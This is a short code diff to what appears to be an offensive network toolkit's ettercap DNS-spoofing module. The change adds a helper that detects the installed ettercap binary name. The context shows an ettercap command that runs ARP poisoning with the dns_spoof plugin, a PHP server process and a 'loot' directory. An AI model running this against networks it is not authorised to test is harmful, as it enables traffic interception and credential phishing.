@@ -96,6 +96,18 @@ ettercap_process = None
 php_server_process = None
 
 LOOT_DIR = os.path.join(KTOX_ROOT, 'loot', 'attack_ettercap_dns')
+
+def _find_ettercap() -> str:
+    """Return the correct ettercap binary name for this system.
+    Kali installs the text-only build as 'ettercap-text-only'; some
+    systems use 'ettercap' or 'ettercap-text'.  Falls back to 'ettercap'
+    so error messages stay meaningful."""
+    for name in ("ettercap", "ettercap-text-only", "ettercap-text"):
+        if subprocess.run(["which", name], capture_output=True).returncode == 0:
+            return name
+    return "ettercap"
+
+ETTERCAP_BIN = _find_ettercap()
 os.makedirs(LOOT_DIR, exist_ok=True)
 LAST_SPOOF_IP = None
 
@@ -243,7 +255,7 @@ def start_dns_spoofing():
         # -P dns_spoof: enable dns_spoof plugin
         # -i <interface>: specify interface
         ettercap_command = [
-            "ettercap", "-Tq", "-M", "arp:remote", "-P", "dns_spoof", "-i", NETWORK_INTERFACE
+            ETTERCAP_BIN, "-Tq", "-M", "arp:remote", "-P", "dns_spoof", "-i", NETWORK_INTERFACE
         ]
         ettercap_process = subprocess.Popen(
             ettercap_command,
@@ -312,7 +324,7 @@ def stop_dns_spoofing():
 
 def check_dependencies():
     """Check for required command-line tools."""
-    for dep in ["ettercap", "php"]:
+    for dep in [ETTERCAP_BIN, "php"]:
         if subprocess.run(["which", dep], capture_output=True).returncode != 0:
             return dep
     return None
